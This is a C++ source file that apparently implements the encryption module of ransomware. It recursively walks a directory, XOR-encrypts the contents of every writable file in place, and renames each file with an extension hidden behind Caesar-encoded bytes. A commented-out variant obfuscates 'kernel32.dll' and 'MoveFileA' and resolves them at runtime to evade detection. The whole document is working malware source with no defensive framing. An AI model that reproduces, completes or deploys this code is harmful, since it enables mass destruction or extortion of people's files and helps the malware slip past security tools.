#include "Crypt.h"

Crypt::Crypt() {}

VOID Crypt::startCrypt() {
	this->_traverse_directory(this->startingPath);
}

VOID Crypt::_infect_file(const fs::directory_entry& file) {
	XORCryptFile(file);
	if (!this->_is_file_infected(file)) {
		this->_change_extension(file);
	}
}

BOOL Crypt::_is_file_infected(const fs::directory_entry& file) {
	std::vector<unsigned char> loc_extension = { 0x0c, 0x4a, 0x4d, 0x41 };

	std::string loc_extension_decrypted = this->decryptCaesar(loc_extension, 0xDE);
	std::string current_extension = file.path().extension().string() + '\0';

	if (current_extension.find(loc_extension_decrypted) != std::string::npos) {
	//if (current_extension == loc_extension_decrypted) {
		return TRUE;
	} 
	return FALSE;
}

VOID Crypt::_traverse_directory(const std::wstring& folderPath) {
	for (const auto& dirEntry : fs::recursive_directory_iterator(folderPath)) {
		if (dirEntry.is_regular_file()) {
			fs::file_status status = dirEntry.status();

			if ((status.permissions() & fs::perms::owner_write) != fs::perms::none) {
				std::cout << dirEntry << std::endl;
				_infect_file(dirEntry);
			}
		}
	}
}

VOID Crypt::XORCryptFile(const fs::directory_entry& file) {
	std::vector<char> encrypted_content = encryptBytes(file);
	std::ofstream output(file.path().string(), std::ios::binary);

	if (!output.is_open()) {
		return;
	}

	output.write(&encrypted_content[0], encrypted_content.size());

	output.close();

	return;
}

VOID Crypt::_change_extension(const fs::directory_entry& file) {
	std::vector<unsigned char> loc_extension = { 0x0c, 0x4a, 0x4d, 0x41 };

	fs::path filePath = file.path();
	fs::path newFilePath = filePath;
	std::string new_extension = filePath.extension().string() + this->decryptCaesar(loc_extension, 0xDE);
	newFilePath.replace_extension(new_extension);

	std::error_code ec;
	fs::rename(filePath, newFilePath, ec);

	return;
}

//VOID Crypt::_change_extension(const fs::directory_entry& file) {
//	// Decrypt the extension and kernel32.dll string
//	std::vector<unsigned char> loc_extension = { 0x0c, 0x4a, 0x4d, 0x41 };
//	std::string new_extension = this->decryptCaesar(loc_extension, 0xDE);
//
//	std::vector<unsigned char> kernel32 = { 0x49, 0x43, 0x50, 0x4c, 0x43, 0x4a, 0x11, 0x10, 0xc, 0x42, 0x4a, 0x4a };
//	std::string kernel32_str = this->decryptCaesar(kernel32, 0xDE);
//
//	// File paths
//	fs::path filePath = file.path();
//	fs::path newFilePath = filePath;
//	newFilePath.replace_extension(filePath.extension().string() + new_extension);
//
//	// Convert file paths to C-strings
//	std::string oldPathStr = filePath.string();
//	std::string newPathStr = newFilePath.string();
//
//	// Load kernel32.dll and resolve MoveFileA
//	HMODULE hKernel32 = LoadLibraryA(kernel32_str.c_str());
//	if (hKernel32) {
//		std::vector<unsigned char> moveFileA = { 0x2b, 0x4d, 0x54, 0x43, 0x24, 0x47, 0x4a, 0x43, 0x1f };
//		std::string moveFileA_str = this->decryptCaesar(moveFileA, 0xDE);
	//
//		MoveFileA_t pMoveFileA = (MoveFileA_t)GetProcAddress(hKernel32, moveFileA_str.c_str());
//		if (pMoveFileA) {
//			// Rename the file using MoveFileA
//			pMoveFileA(oldPathStr.c_str(), newPathStr.c_str());
//		}
//		FreeLibrary(hKernel32);
//	}
//
//	return;
//}

std::vector<char> Crypt::encryptBytes(const fs::directory_entry& file) {
	std::ifstream entry(file.path().string(), std::ios::binary);

	if (!entry.is_open()) {
		return {};
	}

	std::vector<char> bytes(std::istreambuf_iterator<char>(entry), {});

	for (size_t i = 0; i < bytes.size(); ++i) {
		//std::cout << bytes[i];
		bytes[i] ^= this->key;
	}

	entry.close();

	return bytes;
}

std::string Crypt::_decryptString(const std::string& encryptedString) {
	std::string decrypted;
	for (char c : encryptedString) {
		decrypted.push_back(c ^ 0xAA); // Usando XOR como ejemplo simple
	}
	return decrypted;
}

std::string Crypt::encryptCaesar(std::vector<unsigned char>& data, int key) {
	for (size_t i = 0; i < data.size(); i++) {
		data[i] = static_cast<unsigned char>((data[i] + key) % 0x100);
	}

	std::string str(data.begin(), data.end());
	str.push_back('\0');

	return str;
}

std::string Crypt::decryptCaesar(std::vector<unsigned char>& data, int key) {
	for (size_t i = 0; i < data.size(); i++) {
		data[i] = static_cast<unsigned char>((data[i] + (0x100 - key)) % 0x100);
	}

	std::string str(data.begin(), data.end());
	str.push_back('\0');

	return str;
}
